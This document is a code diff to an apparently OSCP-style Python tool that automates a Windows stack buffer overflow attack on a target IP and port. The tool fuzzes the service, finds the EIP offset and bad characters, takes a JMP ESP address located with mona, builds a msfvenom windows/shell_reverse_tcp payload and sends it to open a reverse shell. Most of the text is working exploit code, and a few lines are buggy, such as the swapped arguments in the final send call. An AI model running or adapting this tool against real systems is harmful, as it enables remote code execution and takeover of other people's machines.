@@ -11,6 +11,7 @@ ip = ''                                                     # Target IP
 port = ''                                                   # Target Port
 _delimiter = f'************************************\n'      # User adjustable vertical process delimiters
 _current_step = 0                                           # Incremental counter for tracking all steps
+_offset = ''                                                # Universal tracking of the offset value
 _known_bad_chars = [                                        # Universal storage of chars deemed problematic
     '00',       # NULL
     '0a',       # Line Feed
@@ -20,6 +21,7 @@ _known_bad_chars = [                                        # Universal storage 
 payload = ''                                                # Tracking changes to payload throughout process
 exit_option = f'[\'q\' to quit]'                            # Generic Exit Message appended to most messages
 post_direction = f'Please try again.'                       # Generic Instructional Addition
+buffer_fill_location = 'after'                              # Default buffer fill. Some target buffers fall before esp
 bad_chars = (                                               # [-] Already removed 00 (NULL) 0a (\n) 0d (\r) ff (\f)
     "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
     "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -80,7 +82,6 @@ def send_var(_var, _ip, _port):                                     # Rewrite he
         #passwd = f'PASS {_var}\r\n'
         #s.send(b'passwd')
         #s.recv(1024)
-        #print(type(passwd), len(passwd), 'password shit')
         #s.send(b'QUIT\r\n')
         s.close()
         time.sleep(1)
@@ -157,7 +158,7 @@ def increase_len_msg(_char_length):
 def update_instruction_msg():
     global _delimiter
     global _current_step
-    _current_step = ++_current_step
+    _current_step = _current_step + 1
     msg = f'STEP {_current_step} {_delimiter}'
     print(msg)
 
@@ -269,7 +270,6 @@ def fuzz_test(_ip, _port, _char_length):
     global _delimiter
     buffers = []
     ascii_len = 100
-    print(_char_length, type(_char_length))
     buffer_max_len = _char_length/ascii_len
     while len(buffers) <= buffer_max_len:
         buffers.append("A" * ascii_len)
@@ -288,7 +288,7 @@ def fuzz_test(_ip, _port, _char_length):
                 break
 
     msg = f'[+] Potential failure at byte length: {len(current_buffer)} bytes. Investigate target registers noting ' \
-          f'any potentially overwritten.\n\tDid you identify an overflow and exploitable register? (Y/N) {exit_option}'
+          f'any potentially overwritten.\n\tDid you identify an overflow & exploitable register? (Y/N) {exit_option}\n'
     try:
         response = input(msg).lower()
     except:
@@ -307,10 +307,14 @@ def fuzz_test(_ip, _port, _char_length):
     return int(len(current_buffer))
 
 
-def loop_bad_char_test(_payload, _ip, _port):
+def loop_bad_char_test(_payload, _ip, _port, _reg_test_word, a_buffer):
     global _delimiter
     global bad_chars
     global _known_bad_chars
+    global buffer_fill_location
+    global exit_option
+    full_len = len(_payload)
+    print(f'{_delimiter}\n[i] Current KB Hex Characters:\t{", ".join(_known_bad_chars)}\n')
     result = send_var(_payload, _ip, _port)
     print(f'{_delimiter}Payload Result:\n[Expected]:\tfail\n[Actual]:\t{result}\n\n')
     msg0 = f'[?] Did you identify a bad hex character? (\'y\' for yes, \'n\' for no, \'q\' to quit)\n'
@@ -325,23 +329,35 @@ def loop_bad_char_test(_payload, _ip, _port):
     while response != 'y' and response != 'n' and response != 'q':
         response = input(msg0).lower()
     while response == 'y':
+        for _known_bad_char in _known_bad_chars:
+            bad_chars = bad_chars.strip(_known_bad_char)
         kb_chars = ', '.join(_known_bad_chars)
         bad_char = input(f'[i] Current KB Hex Characters:\t{kb_chars}\n{msg1}')
         bad_char = interactive_sanitize(bad_char, msg1, str)
         while len(bad_char) != 2:
-            print(f'Please enter only one hex value at a time (i.e. \'\\x0a\' for \'0x0a\')\n')
+            print(f'Please enter only one hex value at a time (i.e. \'0a\' for \'0x0a\')\n')
             bad_char = interactive_sanitize(input(msg1), msg1, str)
         bad_chars.strip(bad_char)
         if bad_char not in _known_bad_chars:
             _known_bad_chars.append(bad_char)
+            bad_chars = bad_chars.strip(bad_char)
             kb_chars = ', '.join(_known_bad_chars)
             continue_msg()
-            send_var(_payload.strip(kb_chars), _ip, _port)
-            response = input(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg2}')
+            if buffer_fill_location == 'after':
+                _payload = f'{a_buffer}LOVE{((full_len - 4 - len(bad_chars)) * "C")}'
+            elif buffer_fill_location == 'before':
+                _payload = f'{a_buffer}LOVE{((full_len - 4 - len(bad_chars)) * "C")}'
+            send_var(_payload, _ip, _port)
+            response = input(f'[i] Current KB Hex Characters:\t{kb_chars}\n{msg2}')
         elif bad_char in _known_bad_chars:
-            while bad_char in _known_bad_chars:
+            while bad_char in _known_bad_chars and response != 'c':
                 print(f'Please try again. The \'{bad_char}\' hex string has already been reported.\n')
-                response = input(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg0}')
+                response = input(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg0} {exit_option}\nOr '
+                                 f'enter \'c\' to continue with current set of known bad hex values.\n')
+                if response == 'q':
+                    exit(0)
+                elif response == 'c':
+                    break
             continue_msg()
 
 
@@ -351,6 +367,7 @@ def main():
     global _known_bad_chars
     global bad_chars
     global payload
+    global _offset
     global ip
     global port
     start_time = time.time()
@@ -401,6 +418,7 @@ def main():
     offset = execute_command(sys_command).split(' ')
     offset = int(offset[len(offset) - 1].strip('\n'))
     initial_summary_msg(offset, eip_reg_value)
+    _offset = offset
     continue_msg()
 
     # ****************************************************************************************
@@ -453,32 +471,39 @@ def main():
     # Loop through bad chars test, storing bad_chars for filtering our future payload.
     # ****************************************************************************************
     update_instruction_msg()
-    loop_bad_char_test(payload, ip, port)
+    loop_bad_char_test(payload, ip, port, reg_test_word, a_buffer)
 
     # ****************************************************************************************
     # Find target Register's JMP Call (ex. JMP ESP) and generate the payload
     # ****************************************************************************************
     update_instruction_msg()
-    msg = f'You now must find an address containing \'jump <reg>\' using `!mona` from within Immunity.\n Enter ' \
-          f'the target candidate address now. (\'7cb79e3f\' for \'0x7cb79e3f\')\n'
+    msg = f'{_delimiter}\nNEXT STEP GOAL:\nFind the address with the proper JMP <REG>. We will write this to EIP.\n' \
+          f'[+] [STEPS] -----\n1.\t!mona modules\t\t# ALSR:False, DEP:False, SafeSEH:False\n\n2.\tcspeakes@kali# ' \
+          f'$(locate nasm_shell)\nnasm> JMP ESP\n00000000  FFE4\t\t\tjmp esp\n\n3. immunity debugger console [!mona ' \
+          f'find -s \"\\xff\\xe4\" -m <module_from_step_one.dll>\t\t#Note one of the candidate addresses returned. ' \
+          f'This is what we will use to place into EIP.\n\nPlease enter the candidate address now (Enter ' \
+          f'\'42414241\' for 0x42414241).\n'
     instr_address = input(f'{msg} {exit_option}').lower()
+    instr_address = interactive_sanitize(instr_address, msg, str)
     if instr_address == 'q':
         exit()
-    if len(instr_address) != 8 and instr_address != 'q':
-        while len(instr_address) != 8:
-            print(f'{_delimiter}Error{_delimiter}Provided Memory Address is not of proper length. Please enter '
-                  f'a valid hex memory address.')
-            instr_address = input(msg).lower()
-    instr_address = interactive_sanitize(instr_address, msg, 'hex')
+    while len(instr_address) != 8 and instr_address != 'q':
+        print(f'[-] [Error]{_delimiter[:3]}Provided Memory Address is not of proper length. Please enter '
+              f'a valid hex memory address.')
+        instr_address = interactive_sanitize(input(msg).lower(), msg, str)
     x = endian_reverse(instr_address)
-    le_instr_address = f'\\x{x[3:4]}\\x{x[2:3]}\\x{x[1:2]}\\x{x[0:1]}'
     get_elapsed_time(start_time, 'loud')
+    msg = f'Enter a nop sled amount to prepend to the payload. (0 is acceptable):\n'
+    nop_sled = interactive_sanitize(input(msg), msg, int)
+    bad_byte_str = '"' + str("\\x".join(_known_bad_chars))
     sys_command = f'msfvenom --payload windows/shell_reverse_tcp LHOST={local_ip} LPORT={local_port} ' \
-                  f'EXITFUNC=thread -f c -a x86 --platform windows -b {"".join(_known_bad_chars)}'
+                  f'EXITFUNC=thread -f c -a x86 --platform windows -b {bad_byte_str} -n {nop_sled}'
     continue_msg()
-    msg = f'{_delimiter}Alert!{_delimiter}Ensure that you are listening on port {local_port}!\n(Enter \'c\' to ' \
-          f'continue, \'q\' to quit.\n'
+    msg = f'[!] Alert! {_delimiter[:3]}Ensure that you are listening on port {local_port}!\n(Enter \'c\' to ' \
+          f'continue, \'q\' to quit.)\n'
     success = input(msg)
+    if success.lower() == 'q':
+        exit(0)
     while success != 'q' and success != 'c':
         print(f'Incorrect Value. Enter \'c\' to continue, \'q\' to quit.\n')
         success = input(msg)
@@ -486,8 +511,12 @@ def main():
             exit(0)
         elif success == 'c':
             break
-    execute_command(sys_command)
-    print(f'{_delimiter}Did you get root? If not, start over from the beginning.{_delimiter}')
+    shellcode = execute_command(sys_command)
+    c_buffer_fill = (char_length - len(a_buffer) - 4 - len(shellcode)) * 'C'
+    final_payload = f'{a_buffer}{endian_reverse(instr_address)}{shellcode}{c_buffer_fill}'
+    print('Payload Schema: {a_buffer}{endian_reverse(instr_address)}{shellcode}{c_buffer_fill}')
+    send_var(ip, port, final_payload)
+    print(f'{_delimiter}\nDid you get root? If not, start over from the beginning.\n{_delimiter}')
 
 
 if __name__ == "__main__":
